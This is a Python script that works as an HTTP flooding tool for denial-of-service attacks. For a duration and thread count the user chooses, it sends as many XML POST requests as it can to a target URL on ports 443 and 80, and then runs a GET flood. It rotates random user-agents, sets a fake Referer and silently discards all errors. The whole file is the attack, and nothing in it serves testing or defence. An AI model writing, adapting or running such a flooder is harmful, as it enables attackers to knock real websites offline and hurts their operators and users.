import requests
import time
import argparse
import random
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def read_file(file_name):
    with open(file_name, 'r') as f:
        return f.read()

def get_useragents(file_name):
    useragents = read_file(file_name)
    useragents = (ua for ua in useragents.split('\n') if ua)
    return list(useragents)

def send_get_request(url, useragent):
    headers = {'User-Agent': useragent}
    try:
        response = requests.get(url, headers=headers)
    except Exception as e:
        pass

def flood_get(url, run, thread):
    useragents = get_useragents('ua.txt')
    threads_finished = 0
    start_time = time.time()
    with ThreadPoolExecutor(max_workers=thread) as executor:
        while time.time() - start_time < run:
            useragent = random.choice(useragents)
            executor.submit(send_get_request, url, useragent)
            threads_finished += 1
    logger.info("sent: %s", threads_finished)
def send_request(url, payload, useragent, port):
    headers = {'Content-Type': 'application/xml; charset=utf-8', 'User-Agent': useragent, 'Referer': 'objective'}
    try:
        with requests.Session() as session:
            if port == 443:
                response = session.post(url, data=payload.encode('utf-8'), headers=headers, timeout=11)
            else:
                response = session.post(f"{url}:{port}", data=payload.encode('utf-8'), headers=headers, timeout=11)
    except Exception as e:
        pass

from concurrent.futures import ThreadPoolExecutor

def main(url, run, thread):
    useragents = get_useragents('ua.txt')
    data = read_file('data.xml')
    threads_finished = 0
    start_time = time.time()
    with ThreadPoolExecutor(max_workers=thread) as executor:
        while time.time() - start_time < run:
            useragent = random.choice(useragents)
            port_list = [443, 80]
            for port in port_list:
                executor.submit(send_request, url, data, useragent, port)
                threads_finished += 1
    logger.info("sent: %s", threads_finished)
    logger.info("v")

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', required=True)
    parser.add_argument('--run', required=True)
    parser.add_argument('--thread', required=True)

    args = parser.parse_args()
    try:
        main(args.url, int(args.run), int(args.thread))
        flood_get(args.url, int(args.run), int(args.thread))
    except Exception as e:
        pass
